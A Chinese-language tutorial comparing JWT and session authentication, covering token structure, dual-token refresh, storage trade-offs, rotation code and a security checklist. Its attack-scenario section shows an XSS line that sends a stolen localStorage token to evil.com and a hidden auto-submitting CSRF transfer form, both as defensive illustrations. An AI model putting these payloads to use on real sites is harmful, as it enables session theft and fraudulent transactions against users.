# D14 · JWT vs Session 认证

> **对应主课：** L22 JWT 认证
> **最后核对：** 2026-04-01

---

## 1. 核心区别

```mermaid
flowchart TB
    subgraph Session["Session 认证"]
        s_login["登录"]
        s_server["服务端创建 Session\n存储在内存/Redis"]
        s_cookie["返回 Session ID (Cookie)"]
        s_request["每次请求携带 Cookie"]
        s_verify["服务端查找 Session\n验证身份"]

        s_login --> s_server --> s_cookie --> s_request --> s_verify
    end

    subgraph JWT["JWT 认证"]
        j_login["登录"]
        j_sign["服务端签发 Token\n包含用户信息"]
        j_store["客户端存储 Token"]
        j_request["每次请求携带 Token"]
        j_verify["服务端验证签名\n不查数据库"]

        j_login --> j_sign --> j_store --> j_request --> j_verify
    end

    style Session fill:#764ba210,stroke:#764ba2
    style JWT fill:#42b88310,stroke:#42b883
```

| 维度 | Session | JWT |
|------|---------|-----|
| 状态 | 有状态（服务端存储） | 无状态（客户端存储） |
| 存储位置 | 服务端内存/Redis | 客户端 localStorage/Cookie |
| 扩展性 | 需要共享 Session（Redis） | 天然支持分布式 |
| 注销 | 删除 Session 即可 | 困难（Token 签发后无法撤销） |
| 体积 | Cookie 很小（Session ID） | Token 较大（含用户信息） |
| CSRF | 使用 Cookie → 有 CSRF 风险 | 不用 Cookie → 无 CSRF |
| XSS | Cookie httpOnly 可防 | localStorage 有 XSS 风险 |

---

## 2. JWT 结构

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMiLCJleHAiOjE2OTk5OTk5OTl9.签名
└── Header ──────────┘└── Payload ─────────────────────────────────┘└── Signature ┘
```

```json
// Header: 算法和类型
{ "alg": "HS256", "typ": "JWT" }

// Payload: 用户数据（不要放密码！）
{ "userId": "123", "role": "admin", "exp": 1699999999 }

// Signature: 防篡改
HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

**⚠️ JWT Payload 不是加密的！** 任何人都可以 base64 解码读取内容。它只是签名防篡改。

---

## 3. JWT 的痛点与解决

### 3.1 Token 无法撤销

```
问题：用户修改密码后，旧 Token 仍然有效
解决方案：
  1. 短过期时间（15min） + Refresh Token
  2. 服务端维护 Token 黑名单（Redis）
  3. Token 版本号（数据库存 tokenVersion）
```

### 3.2 双 Token 策略

```typescript
// Access Token: 短期（15min），用于 API 认证
const accessToken = jwt.sign({ userId }, SECRET, { expiresIn: '15m' })

// Refresh Token: 长期（7d），用于刷新 Access Token
const refreshToken = jwt.sign({ userId }, REFRESH_SECRET, { expiresIn: '7d' })
```

```mermaid
sequenceDiagram
    participant Client as 客户端
    participant Server as 服务端

    Client->>Server: API 请求 + Access Token
    Server-->>Client: 401 (Token 过期)
    Client->>Server: POST /refresh + Refresh Token
    Server-->>Client: 新 Access Token
    Client->>Server: 重试 API 请求 + 新 Token
    Server-->>Client: 200 数据
```

### 3.3 存储位置选择

| 位置 | XSS 风险 | CSRF 风险 |
|------|----------|----------|
| localStorage | ❌ 高 | ✅ 无 |
| httpOnly Cookie | ✅ 低 | ❌ 高 |
| 内存 (变量) | ✅ 低 | ✅ 无 |

推荐：Access Token 存内存/localStorage，Refresh Token 存 httpOnly Cookie。

---

## 4. 何时选哪个

| 场景 | 推荐 |
|------|------|
| SPA + API 后端 | ✅ JWT |
| 传统服务端渲染 | ✅ Session |
| 微服务架构 | ✅ JWT（无状态） |
| 需要即时注销 | ✅ Session |
| 移动端 App | ✅ JWT |
| 第三方 API | ✅ JWT (OAuth) |

## 5. 动手实验：解码 JWT

把下面代码粘贴到浏览器控制台，理解 JWT 为什么"不是加密"：

```javascript
// ===== 实验：JWT 解码 =====
// 这是一个真实的 JWT（来自 jwt.io 示例）
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

const [header, payload, signature] = token.split('.')

// Base64 解码 — 任何人都能做！
console.log('Header:', JSON.parse(atob(header)))
// { alg: "HS256", typ: "JWT" }

console.log('Payload:', JSON.parse(atob(payload)))
// { userId: "123", role: "admin", exp: 1700000000 }

// ⚠️ 所以永远不要在 JWT 里放密码、密钥等敏感信息！
// JWT 的签名只是防篡改 — 你改了 payload，签名就对不上了
```

---

## 6. 攻击场景理解

### XSS 窃取 localStorage Token

```javascript
// 如果页面存在 XSS 漏洞，攻击者注入的脚本可以：
const stolenToken = localStorage.getItem('accessToken')
// 发送到攻击者的服务器
fetch('https://evil.com/steal?token=' + stolenToken)
// → 攻击者拿到 Token，可以冒充用户

// 防御：Refresh Token 放 httpOnly Cookie（JS 无法读取）
```

### CSRF 攻击 Cookie

```html
<!-- 如果 Token 存在 Cookie 中，攻击者诱导用户访问 evil.com -->
<!-- evil.com 的页面上有个隐形表单：-->
<form action="https://your-api.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
<!-- 浏览器自动带上 Cookie → API 通过认证 → 转账成功！ -->

<!-- 防御：SameSite Cookie + CSRF Token -->
```

### 最佳组合防御

```mermaid
flowchart TB
    access["Access Token\n存内存变量/Pinia"]
    refresh["Refresh Token\n存 httpOnly + SameSite Cookie"]
    
    xss["XSS 攻击"] -.->|"❌ 无法读 httpOnly Cookie"| refresh
    csrf["CSRF 攻击"] -.->|"❌ SameSite=Strict 阻止"| refresh
    xss -.->|"⚠️ 可读内存变量\n但刷新页面就没了"| access
    
    style access fill:#f9a82520,stroke:#f9a825
    style refresh fill:#42b88320,stroke:#42b883
```

---

## 7. Token 轮换（Rotation）

防止 Refresh Token 泄露后被无限续期：

```typescript
// 服务端 refresh 逻辑
async function refresh(req, res) {
  const oldRefreshToken = req.cookies.refreshToken
  
  // 1. 验证旧 Token
  const payload = jwt.verify(oldRefreshToken, REFRESH_SECRET)
  
  // 2. 检查是否在黑名单中（已被使用过的 Token）
  if (await redis.get(`blacklist:${oldRefreshToken}`)) {
    // 🚨 Token 重放攻击！旧 Token 被使用了两次
    // 立即吊销该用户的所有 Token
    await redis.set(`revoke:user:${payload.userId}`, true)
    return res.status(401).json({ error: 'Token 已被吊销' })
  }
  
  // 3. 将旧 Token 加入黑名单
  await redis.set(`blacklist:${oldRefreshToken}`, true, 'EX', 7 * 86400)
  
  // 4. 签发全新的 Token 对
  const newAccessToken = jwt.sign({ userId: payload.userId }, SECRET, { expiresIn: '15m' })
  const newRefreshToken = jwt.sign({ userId: payload.userId }, REFRESH_SECRET, { expiresIn: '7d' })
  
  // 5. 设置 httpOnly Cookie
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  })
  
  res.json({ accessToken: newAccessToken })
}
```

---

## 8. 生产环境安全检查清单

- [ ] Access Token 有效期 ≤ 15 分钟
- [ ] Refresh Token 存 httpOnly + Secure + SameSite Cookie
- [ ] 已实现 Token Rotation（每次 refresh 颁发新 Token）
- [ ] JWT Payload 不含敏感信息（密码、密钥）
- [ ] 全站 HTTPS
- [ ] 登录接口有速率限制（Rate Limiting）
- [ ] 支持强制注销（Token 版本号或黑名单）

---

## 9. 总结

- JWT 是**无状态认证**，适合 SPA 和分布式系统
- Session 是**有状态认证**，注销更可控
- JWT 的核心问题是"无法撤销"，用双 Token + 短有效期 + Rotation 缓解
- 生产环境 JWT 必须配合 HTTPS、httpOnly Cookie（Refresh Token）、短有效期
- XSS 和 CSRF 是两种不同的攻击向量，Token 存储位置决定了你面对哪种风险
